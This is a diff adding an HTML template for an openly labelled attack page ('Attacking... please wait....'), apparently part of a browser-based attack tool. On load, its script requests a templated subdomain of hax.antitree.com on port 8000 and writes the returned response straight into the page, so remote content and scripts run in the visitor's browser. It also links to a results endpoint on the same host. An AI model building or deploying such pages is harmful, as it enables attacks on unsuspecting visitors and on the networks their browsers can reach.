@@ -1,0 +1,42 @@
+<html><title>Oh shit</title>
+<head></head>
+<body>
+<h1>Attacking... please wait....</h1>
+<script type="text/javascript">
+    function loadXMLDoc(theURL)
+    {
+        if (window.XMLHttpRequest)
+        {// code for IE7+, Firefox, Chrome, Opera, Safari, SeaMonkey
+            xmlhttp=new XMLHttpRequest();
+        }
+        else
+        {// code for IE6, IE5
+            xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+        }
+        xmlhttp.onreadystatechange=function()
+        {
+            if (xmlhttp.readyState==4 && xmlhttp.status==200)
+            {
+                alert(xmlhttp.responseText);
+            }
+        }
+        xmlhttp.open("GET", theURL, false);
+        xmlhttp.send();
+    }
+</script>
+<script>
+	var xmlhttp=false;
+	loadXMLDoc('http://{{hostid}}.hax.antitree.com:8000/');
+	if(xmlhttp==false){ alert("What you doin");}
+	else { document.write(xmlhttp.responseText); }
+	</script>
+
+<div class="jumbotron">
+        <h1>{{title}}</h1>
+        <p class="lead">{{subheader}}</p>
+        <p><a class="btn btn-lg btn-success" href="http://{{hostid}}.hax.antitree.com:8000/results" role="button">Begin</a></p>
+        <!--<iframe src="http://{{hostid}}.hax.antitree.com:10800/about"-->
+      </div>
+
+</body>
+</html>
